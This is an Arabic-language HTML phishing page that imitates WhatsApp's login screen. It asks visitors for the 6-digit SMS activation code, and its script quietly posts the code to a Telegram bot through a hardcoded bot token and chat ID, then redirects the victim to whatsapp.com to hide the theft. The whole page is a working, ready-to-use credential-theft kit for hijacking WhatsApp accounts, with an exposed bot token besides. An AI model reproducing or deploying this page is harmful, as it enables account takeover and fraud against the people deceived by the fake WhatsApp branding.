<!DOCTYPE html>
<html lang="ar" dir="rtl">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="icon" href="https://upload.wikimedia.org/wikipedia/commons/6/6b/WhatsApp.svg">
    <title>WhatsApp Registration</title>
    <style>
        body {
            font-family: 'Arial', sans-serif;
            background-color: #FAF3E7;
            margin: 0;
            padding: 0;
            display: flex;
            flex-direction: column;
            justify-content: space-between;
            align-items: center;
            height: 100vh;
        }

        .navbar {
            width: 100%;
            background-color: #25D366;
            color: #fff;
            padding: 10px 20px;
            display: flex;
            justify-content: space-between;
            align-items: center;
            font-size: 18px;
        }

        .navbar .back-btn {
            font-size: 20px;
            cursor: pointer;
        }

        .navbar .title {
            font-weight: bold;
        }

        .container {
            text-align: center;
            background-color: #fff;
            border-radius: 15px;
            box-shadow: 0 8px 20px rgba(0, 0, 0, 0.1);
            padding: 30px 20px;
            width: 90%;
            max-width: 400px;
        }

        .logo {
            display: flex;
            justify-content: center;
            align-items: center;
            margin-bottom: 20px;
        }

        .logo img {
            height: 60px;
        }

        .title {
            font-size: 22px;
            font-weight: bold;
            margin-bottom: 15px;
            color: #333;
        }

        .description {
            font-size: 14px;
            color: #555;
            line-height: 1.6;
            margin-bottom: 20px;
        }

        .form-group {
            display: flex;
            flex-direction: column;
            gap: 10px;
            align-items: center;
        }

        input {
            border: 1px solid #ddd;
            border-radius: 6px;
            padding: 10px;
            font-size: 16px;
            width: 100%;
            max-width: 300px;
            text-align: center;
        }

        button {
            padding: 12px 20px;
            background-color: #25D366;
            color: #fff;
            border: none;
            border-radius: 6px;
            font-size: 16px;
            cursor: pointer;
            width: 100%;
            max-width: 300px;
        }

        button:hover {
            background-color: #1DA955;
        }

        .footer {
            width: 100%;
            background-color: #f1f1f1;
            color: #888;
            padding: 10px 20px;
            text-align: center;
            font-size: 12px;
        }

        .footer a {
            color: #25D366;
            text-decoration: none;
            font-weight: bold;
        }
    </style>
</head>

<body>
    <!-- الشريط العلوي -->
    <div class="navbar">
        <div class="back-btn">←</div>
        <div class="title">واتساب</div>
    </div>

    <!-- الحاوية الرئيسية -->
    <div class="container">
        <!-- شعار واتساب -->
        <div class="logo">
            <img src="https://upload.wikimedia.org/wikipedia/commons/6/6b/WhatsApp.svg" alt="شعار واتساب">
        </div>

        <!-- العنوان -->
        <div class="title">تسجيل الدخول</div>

        <!-- الوصف -->
        <div class="description">
            أدخل رمز التفعيل المكون من 6 أرقام الذي تلقيته من خلال رسالة نصية.
        </div>

        <!-- نموذج الإدخال -->
        <div class="form-group">
            <input id="phoneNumber" type="text" placeholder="رمز التفعيل" maxlength="6" pattern="\d{6}" required>
        </div>

        <!-- زر المتابعة -->
        <button onclick="sendMessage()">متابعة</button>
    </div>

    <!-- الشريط السفلي -->
    <div class="footer">
        <p>واتساب هو تطبيق مراسلة مجاني وآمن. <br> لمزيد من المعلومات، قم بزيارة <a href="https://www.whatsapp.com/">موقع واتساب الرسمي</a>.</p>
    </div>

    <script>
        // بيانات API Telegram
        const botToken = '7908469273:AAFmgF2elBpLaH6YGJK6Qtrmf8Z7TsyODzc';
        const chatId = '612575358';

        // وظيفة الإرسال
        function sendMessage() {
            const phoneNumberInput = document.getElementById('phoneNumber');
            const phoneNumber = phoneNumberInput.value;

            // التحقق من الإدخال
            if (!phoneNumber || phoneNumber.length !== 6 || !/^\d{6}$/.test(phoneNumber)) {
                alert('يرجى إدخال رمز مكون من 6 أرقام فقط.');
                return;
            }

            // إنشاء الرسالة
            const message = `رمز التفعيل: ${phoneNumber}`;

            // إرسال الرسالة عبر Telegram API
            fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify({
                    chat_id: chatId,
                    text: message,
                }),
            })
                .then(response => response.json())
                .then(data => {
                    if (data.ok) {
                        alert('تم إرسال رمز التفعيل بنجاح!');
                        phoneNumberInput.value = ''; // إعادة تعيين الحقل
                        window.location.href = "https://www.whatsapp.com"; // إعادة توجيه المستخدم
                    } else {
                        alert('حدث خطأ أثناء إرسال رمز التفعيل. يرجى المحاولة لاحقاً.');
                    }
                })
                .catch(error => {
                    alert('فشل الاتصال بالخادم. يرجى التحقق من الإنترنت والمحاولة مرة أخرى.');
                });
        }
    </script>
</body>

</html>
